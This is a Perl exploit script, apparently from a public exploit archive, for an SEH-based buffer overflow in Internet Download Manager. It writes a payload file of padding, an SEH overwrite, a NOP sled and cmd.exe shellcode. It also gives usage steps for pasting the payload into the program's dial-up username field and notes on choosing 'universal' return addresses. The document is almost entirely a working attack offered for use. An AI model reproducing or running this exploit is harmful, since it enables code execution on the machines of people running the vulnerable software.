#!/usr/bin/perl
# 1               ==========================================               1
# 0                   I'm Dark-Puzzle From Inj3ct0r TEAM                   0
# 0                                                                        1
# 1                       dark-puzzle[at]live[at]fr                        0
# 0               ==========================================               1
# 1                              White Hat                                 1
# 0                         Independant Pentester                          0
# 1                      exploit coder/bug researcher                      0
# 0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-1
# Title  : Internet Download Manager All Versions-0day SEH Based Buffer Overflow+Universal.
# Author : Dark-Puzzle (Souhail Hammou)
# Type   : Local 
# Risk   : Critical
# Vendor : Tonec Inc.
# Versions : All versions of IDM are Vulnerable .
# Tested On : Windows XP Service Pack 2 FR 32-bits .
# Date : 14 September 2012
# Gr337ings to : Inj3ct0r Team - Packetstormsecurity.org - Securityfocus.com - Jigsaw - Dark-Soldier ...
# Working On : WinXp SP2 - "Universal" .

#Usage   : Copy this script to idman2.pl
#Execute : perl idman2.pl
#Go to the file bof.txt , Select ALL , then Copy .
# After copying the whole line Go To Downloads ---> Options ----> Dial up / VPN ----> paste the line into the username field and let the password field blank then click Enter .
#French Version : Go to : Telechargement ---> Options ---> Internet ---> then Copy The Whole line from bof.txt and paste it into the username field and let the password field blank then click Enter .

# BETTER COPY THE CONTENT OF THE FILE USING NOTEPAD++
# First Of all , This is a different exploit from (Internet Download Manager - Stack Based Overflow Vulnerability.)
# Second , Script Kiddies will be happy with my latest Idman Vulnerabilities but don't bother, you may face some problems with the shellcode in this exploit So choose wisely the badchars .

my $junk = "A" x 2301 ;
my $nseh = "\xeb\x32\x90\x90";
#look down for Universal address# 0x74ca4cdb OS address (WinXP SP2 Only with oledlg.dll)
my $seh = "\xdb\x4c\xca\x74" ;# For the Universal address details look below .
my $nops = "\x90" x 44 ; 
my $shellcode = 
"\x8B\xEC\x33\xFF\x57".
"\xC6\x45\xFC\x63\xC6\x45".
"\xFD\x6D\xC6\x45\xFE\x64".
"\xC6\x45\xF8\x01\x8D".
"\x45\xFC\x50\xB8\xC7\x93".
"\xBF\x77\xFF\xD0"; # CMD.EXE Shellcode (After passing Automaticaly or with a debugger the exception to the handler we will be able to jmp to our shellcode after some nops .)
my $junkk = "\x90" x 9000; # Not Actually Junk ,This is what makes this exploit work =) So be careful .
$payload= $junk.$nseh.$seh.$nops.$shellcode.$junkk;
open(myfile,'>bofme.txt');
print myfile $payload;
close(myfile);
print "\x44\x69\x73\x63\x6f\x76\x65\x72\x65\x64\x20\x26\x20\x57\x72\x69\x74\x74\x65\x6e\x20\x42\x79\x20\x44\x61\x72\x6b\x2d\x50\x75\x7a\x7a\x6c\x65\n\n";
print "Creating Evil File Please Be Patient\n\n";
sleep (4);
print " ".length($payload)." bytes has been written\n\n";
print "File bofme.txt Created Successfuly .\n\n";
print "Now Copy its content to Username field in IDMan DialUp options\n\n";

##########Universal Address##############
# I worked on finding a universal address and that's what I found .
# First you may find some pop r/pop r2/ret / call dword ptr SS:[R+30] addresses in idman.exe Module .
# but The problem here is that all the addr in this module look like this : 0x00ffffff
# So it will terminate the string and the vulnerability will not be executed .
# Ok, the second problem is in idmmkb.dll we found an address "rebase" . As I analysed I found that the rebase goes between "a" and "b" in the address base
# And the Top always stays the same . It will give us in this case two Possibilities 50% of each address to be the correct one in every program execution .
# So All to do here is to try these two addresses manually or using a program .
# The First one :  0x017A1B13
# The Second one : 0x017B1B13
# All you have to do is replace one of these in the "pointer to the next SE Handler" .
########################################

#Datasec Team .